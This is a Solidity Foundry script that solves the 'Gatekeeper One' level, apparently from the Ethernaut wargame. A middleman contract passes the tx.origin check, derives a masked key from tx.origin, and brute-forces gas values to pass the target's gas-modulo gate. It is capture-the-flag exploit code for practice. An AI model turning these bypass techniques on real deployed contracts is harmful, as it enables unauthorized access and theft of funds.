// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

// ================================================================
// │                    LEVEL 13 - GATEKEEPER ONE                 │
// ================================================================
contract GatekeeperOneMiddleman {
    function run(address targetContract) public {
        // Gate one is passed just by calling the enter function from this contract
        // causing the tx.origin to be different from the msg.sender

        bool succeeded = false;

        // Gate three requires...
        bytes8 key = bytes8(uint64(uint160(tx.origin)) & 0xffffffff0000ffff);

        uint256 gas = 65782;

        // Gate two requires calculating the gas remaining...
        for (uint256 i = gas - 5052; i < gas + 5052; i++) {
            console.log("Trying gas: ", i);
            (bool success,) = address(targetContract).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                succeeded = success;
                break;
            }
        }
    }
}
